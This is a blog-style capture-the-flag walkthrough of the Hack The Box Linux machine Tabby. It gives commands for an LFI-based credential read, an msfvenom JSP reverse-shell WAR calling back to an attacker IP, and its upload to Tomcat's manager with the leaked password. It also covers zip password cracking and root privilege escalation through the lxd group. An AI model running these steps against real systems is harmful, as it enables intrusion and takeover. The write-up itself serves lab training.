+++
author = "Nick"
categories = ["hack the box", "Linux", "easy", "LFI", "burpsuite", "tomcat", "reverse shell", "netcat", "war file", "fcrackzip", "lxd"]
date = 2020-11-07T16:00:00Z
description = ""
draft = false
thumbnail = "/images/2020/06/info-4.png"
slug = "hack-the-box-tabby"
summary = "Welcome back CTF nerds. Today we are doing the machine Tabby from Hack the Box. This is a Linux machine with an easy difficulty. Let's jump in!"
tags = ["hack the box", "Linux", "easy", "LFI", "burpsuite", "tomcat", "reverse shell", "netcat", "war file", "fcrackzip", "lxd"]
title = "Hack the Box - Tabby"

+++


Welcome back CTF nerds. Today we are doing the machine Tabby from Hack the Box. This is a Linux machine with an easy difficulty. Let's jump in!

Like we do with every box, kick it off with an `nmap` scan: `nmap -sC -sV -p- -oA allscan 10.10.10.194`

Here are our results:
```
Nmap scan report for 10.10.10.194
Host is up (0.042s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http     Apache Tomcat
|_http-title: Apache Tomcat
8443/tcp open  ssl/http LXD container manager REST API
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=root@ghost/organizationName=linuxcontainers.org
| Subject Alternative Name: DNS:ghost, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2020-06-16T13:34:28
|_Not valid after:  2030-06-14T13:34:28
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

These results are pretty basic. `Tomcat` on 8080 a container manager and an `Apache` instance. When we visit the machine via a web browser we see that we have a hosting platform. When we start sifting through the source of the page, we see some useful things.

We see that the site is refereted to as `megahosting.htb` and there is a link toe a `.php` location with an argument.

![](/images/2020/06/image-83.png)

We'll add this to our hosts file and enumerate a bit. For starters we kick of a `gobuster` to see what else might be around.

Command:
`gobuster dir -u http://megahosting.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt`

While that runs, we'll also want to fuzz for subdomains.

Command:
`ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u 'http://FUZZ.megahosting.htb' -c -v`

While those run we'll check for some other basic things, like an `LFI`. We check the `news.php` location and sure enough, there is an `LFI`. We'll load up `Burpsuite` to help with this one.

![](/images/2020/06/image-84.png)

We send our `LFI` to the Repeater function and get the `passwd` file. We get this file so that we can get a good idea of the users on the machine.

![](/images/2020/06/image-85.png)

![](/images/2020/06/image-86.png)

We see our user we are potentially after is `Ash`. Now in addition to this, if we visit port `8080` we can see a 'default' `Tomcat` install.

![](/images/2020/06/image-87.png)

What we really want to take away from this is that it gives us quite a few paths. The one of particular interest is `/etc/tomcat9/tomcat-users.xml`. Now this isn't that standard path you might think. It's actually the path WITHIN the `tomcat9` instance.

![](/images/2020/06/image-92.png)

![](/images/2020/06/image-93.png)

Now that we have the user credentials we log in. Now that we can authenticate, we can look for some `Authenticated RCE's`. None of the 'standard' `Metasploit` modules seemed to work. Some googling around lead us [here](https://pentestlab.blog/2012/08/26/using-metasploit-to-create-a-war-backdoor/) and [here](https://gist.github.com/pete911/6111816). The first is on creating a backdoor using a `war` file. The second is how to leverage `curl` to upload the file.

Let's create our payload first.

Command:
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=
7777 -f WAR > exploit666.war`


This creates our payload.

![](/images/2020/06/image-94.png)

Now we just need to upload it following the gist above.

Command:
`curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file rootme.war "http://megahosting.htb:8080/manager/text/deploy?path=/exploit666.war"`


We use the `/manager/text/deploy` path as stated [here](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html).

![](/images/2020/06/image-91.png)

Now with our payload uploaded, we just need to start up a `netcat` listener and execute. To do that we browse to our payload on 8080. Once we do, we get a shell back on our listener! Note: I tried the above at first with `MSFPC` and wasn't able to catch a shell back.

![](/images/2020/06/image-95.png)

We'll upgrade our shell and look for a way to pivot into `ash`. We'll download `linpeas` and start enumerating. We see a file listed as `16162020_backup.zip`

![](/images/2020/06/image-96.png)

We'll try to download this and see what's inside.

![](/images/2020/06/image-97.png)

When we try to unzip it, we are prompted with a password.

![](/images/2020/06/image-98.png)

We can try to brute the password with `fcrackzip`.

Command:
`fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u 16162020_backup.zip`

![](/images/2020/06/image-99.png)

As we look through the files, its just a basic backup. Nothing to be found inside. So the next logical step is, well, maybe this user has reused passwords. We try to `su` to `ash`.

Command:
`su ash`

And it works!

![](/images/2020/06/image-100.png)

We head over to the users home directory and grab our `Users.txt` flag. We will generate an new keypair for this machine using `ssh-kegen`. We can then copy this key over to the `authorized_keys` file under Ash and SSH in. Now we can start our internal enumeration again, this time as Ash.

The enumeration doesn't come back with much. the `lxd` group is is a slightly different group to see a user as a part of. Some googleing around for 'Priv esc lxd` lead me to [this resource](https://www.hackingarticles.in/lxd-privilege-escalation/). We want this part in particular:

![](/images/2020/06/image-101.png)

Let's follow these steps as shown to hopefully escalate! From the PoC:

Command:
```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

The first run failed due to some kind of connectivity error. I simply deleted the rootfs folder and re-ran `./build-apline`. Once it finished successfully, we are left with a ziped file.

Now we spin up a `SimpleHTTPServer`.

Command:
`python -m SimpleHTTPServer 80`

And download the file. Now we import the image file.

Command: 
`lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias rfimage`

![](/images/2020/06/image-102.png)

We can use the `lxc image list` command to see if our image has been imported correctly.

![](/images/2020/06/image-103.png)

Now we issue config commands to our image.

Commands:
```
lxc init rfimage fire -c security.privileged=true
```

![](/images/2020/06/image-104.png)

`lxc config device add fire rfimage disk source=/ path=/mnt/root recursive=true`

![](/images/2020/06/image-105.png)

```
lxc start fire
lxc exec fire /bin/sh
```

![](/images/2020/06/image-106.png)

Now that we're in the contiainer we navigate to `/mnt/root` like the PoC says. This allows us to see all the resources from the host machine.

![](/images/2020/06/image-108.png)

Awesome! We head over to the `root` directory to group our `root.txt` flag!

![](/images/2020/06/image-107.png)

This box was pretty fun. If you enjoyed this write-up and / or learned something along the way, shoot some me some respect on [Hack The Box](https://www.hackthebox.eu/home/users/profile/95635).



